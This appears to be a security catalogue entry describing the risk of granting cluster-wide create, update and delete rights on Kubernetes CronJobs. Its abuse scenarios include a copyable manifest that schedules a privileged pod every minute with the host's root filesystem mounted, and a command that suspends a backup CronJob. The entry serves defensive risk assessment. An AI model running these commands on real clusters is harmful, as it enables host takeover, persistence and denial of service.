---
id: 1039
title: "Manage CronJobs cluster-wide (scheduled privileged execution, persistence)"
description: "Permits creating, updating, or deleting CronJobs across all namespaces. CronJobs schedule recurring batch jobs. This is critical as it allows scheduling the execution of pods (potentially privileged) at regular intervals, leading to privilege escalation, persistent access, and tampering."
category: Elevation of Privilege
risk_level: RiskLevelCritical
date: ""
---

## Overview

| Field         | Value                                                                                                               |
| ------------- | ------------------------------------------------------------------------------------------------------------------- |
| ID            | 1039                                                                                                                |
| Name          | Manage CronJobs cluster-wide (scheduled privileged execution, persistence)                                          |
| Risk Category | Elevation of Privilege                                                                                              |
| Risk Level    | {{< risk Critical >}}                                                                                               |
| Role Type     | ClusterRole                                                                                                         |
| API Groups    | batch                                                                                                               |
| Resources     | cronjobs                                                                                                            |
| Verbs         | create, update, patch, delete                                                                                       |
| Tags          | {{< tag "Persistence" >}} {{< tag "PrivilegeEscalation" >}} {{< tag "Tampering" >}} {{< tag "WorkloadLifecycle" >}} |

## Description

Permits creating, updating, or deleting CronJobs across all namespaces. CronJobs schedule recurring batch jobs. This is critical as it allows scheduling the execution of pods (potentially privileged) at regular intervals, leading to privilege escalation, persistent access, and tampering.

## Abuse Scenarios

1. Create a new CronJob that schedules a privileged pod to run periodically.

```bash {copy=true}
kubectl create -n <namespace> -f - <<EOF
apiVersion: batch/v1
kind: CronJob
metadata:
  name: privileged-cronjob
spec:
  schedule: "*/1 * * * *" # Every minute
  jobTemplate:
    spec:
      template:
        spec:
          hostNetwork: true
          hostPID: true
          containers:
          - name: attacker
            image: busybox
            command: ["/bin/sh", "-c", "echo 'Pwned!' > /host/pwned.txt"]
            securityContext:
              privileged: true
            volumeMounts:
            - mountPath: /host
              name: host-root
          volumes:
          - name: host-root
            hostPath:
              path: /
          restartPolicy: OnFailure
EOF
# Example: kubectl create -n default -f - <<EOF ... EOF

```

2. Suspend a critical CronJob, preventing scheduled tasks from running (DoS).

```bash {copy=true}
kubectl patch cronjob <cronjob-name> -n <namespace> -p '{"spec" : {"suspend" : true}}'
# Example: kubectl patch cronjob backup-db -n production -p '{"spec" : {"suspend" : true}}'

```
